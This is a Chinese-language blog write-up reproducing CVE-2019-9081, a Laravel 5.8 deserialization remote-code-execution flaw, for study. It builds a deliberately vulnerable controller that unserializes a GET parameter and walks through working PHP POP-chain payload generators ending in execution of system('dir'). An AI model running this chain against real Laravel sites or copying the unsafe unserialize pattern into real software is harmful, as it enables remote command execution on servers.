# Laravel v5.8 反序列化rce (CVE-2019-9081) 复现 - MustaphaMond - 博客园

> 原文：[https://www.cnblogs.com/20175211lyz/p/12343980.html](https://www.cnblogs.com/20175211lyz/p/12343980.html)

# 序

Laravel是一款比较流行的优秀php开发框架，本身也比较重，通过这个框架来接触大型框架的代码审计、包括锻炼反序列化漏洞的挖掘利用是比较合适的。在学习了几天Laravel开发以后，我尝试复现了一下CVE-2019-9081，整体过程和原作者还是有些区别的，原作者思维比较跳跃的地方，我按自己的思维尝试摸索，有错误之处欢迎斧正。

# 环境搭建

使用composer+PhpStorm+xampp的方式配置laravel
首先下载composer，安装完成之后配置国内镜像源
`composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/`
使用PhpStorm直接在`xampp/htdocs`下创建composer项目
![](../Images/785af5d883c7388635e39940f8cd438a.png)

访问`public`目录出现如下界面表示Laravel配置成功
![](../Images/82e1584c444afd571fea23ab5908804e.png)

接下来创建控制器
`php artisan make:controller DemoController`
配置路由

```
Route::get('/demo', '\App\Http\Controllers\DemoController@demo'); 
```

控制器

```
class DemoController extends Controller
{
    public function demo()
    {
        if (isset($_GET['c'])) {
            $code = $_GET['c'];
            unserialize($code);
        } else {
            highlight_file(__FILE__);
        }
        return "Welcome to laravel5.8";
    }
} 
```

访问`public/demo`
![](../Images/913611b457e8c5aa3e854ff7d0a87f58.png)

# pop链入口

Laravel v5.7相较Laravel v5.6在`vendor/laravel/framework/src/Illuminate/Foundation/Testing`下新增了`PendingCommand.php`，其中有`PendingCommand`类，它的`__destruct`方法是这样的

![](../Images/1f00957da159587a13a5f3aad1d2dc70.png)

跟进`run`方法，在`run`方法的头顶，赫然写着`Execute the command`

![](../Images/705c00ab512e67a876e824a8c03286d9.png)

一大堆东西，其中`$exitCode = $this->app[Kernel::class]->call($this->command, $this->parameters);`看起来有可能是执行命令的函数，前面会经过很多代码，这时候不如debug跟一下

# 初探`run`

这时候先随便构造个payload

```
<?php

namespace Illuminate\Foundation\Testing{
    class PendingCommand{
        public $test;
        protected $command;
        protected $parameters;
        protected $app;
        public function __construct($command, $parameters, $test, $app)
        {
            $this->command = $command;
            $this->parameters = $parameters;
        }
    }
}

namespace{
    $a = new Illuminate\Foundation\Testing\PendingCommand('system', 'dir');
    echo urlencode(serialize($a));
} 
```

传进去，断点断下来，单步

`hasExecuted`默认是`false`，直接往下走，进到`run`
![](../Images/0922c87b0c303d25f91c57f6da303125.png)

有个`mockConsoleOutput()`，跟进去
![](../Images/e4a255de1e1da3911c31cda643afaf40.png)

第一句直接报错了，看一下laravel的报错

![](../Images/fbe3a77ec13e2436c3123b0000194b93.png)

原来是我们`$parameters`类型问题，改成数组

```
<?php

namespace Illuminate\Foundation\Testing{
    class PendingCommand{
        public $test;
        protected $command;
        protected $parameters;
        protected $app;
        public function __construct($command, $parameters, $test, $app)
        {
            $this->command = $command;
            $this->parameters = $parameters;
        }
    }
}

namespace{
    $a = new Illuminate\Foundation\Testing\PendingCommand('system', ['dir']);
    echo urlencode(serialize($a));
} 
```

重来还是报错，这次是第一句里面的`createABufferedOutputMock()`
![](../Images/b060aeb709173dccae10e4c280f5b0ab.png)

这时候`$this->test`是`null`，这个属性是可控的。全局搜索`$expectedQuestions`，找找有没有可用的类，发现只有一个`trait`，没法实例化。
![](../Images/f1b7bc746a807ffbea57d51383b30297.png)

# `__call`续接pop链

取属性取不到怎么办？答案是找`__call`。这一步比较自由，原作者用的是`Illuminate\Auth\GenericUser`，我找的是`Faker\DefaultGenerator`，`$default`完全可控
![](../Images/c3cf23ba655d4088d67dea8b0d3066cd.png)

这时候再修改一下payload

```
<?php

namespace Illuminate\Foundation\Testing{
    class PendingCommand{
        public $test;
        protected $command;
        protected $parameters;
        protected $app;
        public function __construct($command, $parameters, $test)
        {
            $this->command = $command;
            $this->parameters = $parameters;
            $this->test = $test;
        }
    }
}

namespace Faker{
    class DefaultGenerator{
        protected $default;

        public function __construct($default = null)
        {
            $this->default = $default;
        }
    }
}

namespace{
    $b = new Faker\DefaultGenerator(['0'=>'1']);
    $a = new Illuminate\Foundation\Testing\PendingCommand('system', ['dir'], $b);
    echo urlencode(serialize($a));
} 
```

然后我们就可以顺利通过`createABufferedOutputMock()`。回到`mockConsoleOutput()`，接下来的`foreach`和刚刚的一样，顺利通过。

# 走出`mockConsoleOutput`

终于马上可以出这个方法，但是再一次报错

```
$this->app->bind(OutputStyle::class, function () use ($mock) {
    return $mock;
}); 
```

这次是因为`$this->app`为`null`。去前面看`app`是个什么
![](../Images/4f941fe530682d0a3a251d6dcb72a337.png)

然而找了半天没找到这么个`Application`类，去文档搜索有`bind()`方法的类
![](../Images/1e11bacfb3d738b360c6bb0374cc767b.png)

`Illuminate\Container\Container`就你了，那么现在的payload是

```
<?php

namespace Illuminate\Foundation\Testing{
    class PendingCommand{
        public $test;
        protected $command;
        protected $parameters;
        protected $app;
        public function __construct($command, $parameters, $test, $app)
        {
            $this->command = $command;
            $this->parameters = $parameters;
            $this->test = $test;
            $this->app = $app;
        }
    }
}

namespace Faker{
    class DefaultGenerator{
        protected $default;

        public function __construct($default = null)
        {
            $this->default = $default;
        }
    }
}

namespace Illuminate\Container{
    class Container{
    }
}
namespace{

    $c = new Illuminate\Container\Container();
    $b = new Faker\DefaultGenerator(['0'=>'1']);
    $a = new Illuminate\Foundation\Testing\PendingCommand('system', ['dir'], $b, $c);
    echo urlencode(serialize($a));
} 
```

总算是走出了`mockConsoleOutput`，回到`run`

# 代码执行

终于走到疑似代码执行的地方

```
$exitCode = $this->app[Kernel::class]->call($this->command, $this->parameters); 
```

这才发现`app`是有要求的，看一下`Kernel::class`好像是个固定值，跟着走，发现下图左下调用栈，这时候我们的目的是让代码走通就行，所以只管往下走就行。
![](../Images/c724a7463bf970b12d14d685346e39db.png)

一直调用到`isBuildable()`除了问题，
![](../Images/39f3466734f9151b2768d7a109d8fbea.png)

往里走到`build`
![](../Images/826421782b804d48787416f4a9ac0465.png)

`$reflector->isInstantiable()`那里过不了，借助反射类看一下，原来`Illuminate\Contracts\Console\Kernel`是个接口，正好`getConcrete()`中，我们可以找到任意一个有`$binding`属性的类来实例化的。
![](../Images/a7e9ff5fca84d936542d1c5d375020ba.png)

正好，我们之前用的`Illuminate\Container\Container`就满足这个条件，由于我们已知`$abstract`变量为`Illuminate\Contracts\Console\Kernel`，所以我们只需通过反序列化定义`Illuminate\Container\Container`的$bindings属性存在键名为`Illuminate\Contracts\Console\Kernel`的二维数组就能进入该分支语句,这时候payload如下

```
<?php

namespace Illuminate\Foundation\Testing{
    class PendingCommand{
        public $test;
        protected $command;
        protected $parameters;
        protected $app;
        public function __construct($command, $parameters, $test, $app)
        {
            $this->command = $command;
            $this->parameters = $parameters;
            $this->test = $test;
            $this->app = $app;
        }
    }
}

namespace Faker{
    class DefaultGenerator{
        protected $default;

        public function __construct($default = null)
        {
            $this->default = $default;
        }
    }
}

namespace Illuminate\Container{
    class Container{
        protected $bindings = [];
        public function __construct($bindings)
        {
            $this->bindings = $bindings;
        }
    }
}
namespace{

    $c = new Illuminate\Container\Container(['Illuminate\Contracts\Console\Kernel'=>['concrete'=>'Illuminate\Container\Container']]);
    $b = new Faker\DefaultGenerator(['0'=>'1']);
    $a = new Illuminate\Foundation\Testing\PendingCommand('system', ['dir'], $b, $c);
    echo urlencode(serialize($a));
} 
```

这时候`isBuildable()`我们第一遍是过不去的
![](../Images/c5e12cc84dbf90160f93fd3ba9faf314.png)

但是进入`make()`以后，第二遍循环时`$concrete`和`$abstract`已经都是`Illuminate\Container\Container`了，注意左下的调用栈
![](../Images/1ec66763cfa2f30a1d92fdd8db485580.png)

成功实例化类，最后逐层返回我们创建的对象。最后我们可以知道通过我们传入的payload，`$this->app[Kernel::class]`最终返回的内容就是我们创建的`Illuminate\Container\Container`类的对象

![](../Images/de75f220025469fee6a52c3324b88707.png)

最后`call`的庐山真面目

![](../Images/ca868bf89be5a840fd3ee1c8eac812c5.png)

成功执行`call_user_func_array('system',array('dir'))`
![](../Images/b9debb456cc6d4de6adadb129cbea37a.png)

# 参考链接

CVE原作者博客 [laravelv5.7反序列化rce(CVE-2019-9081)](https://laworigin.github.io/2019/02/21/laravelv5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/)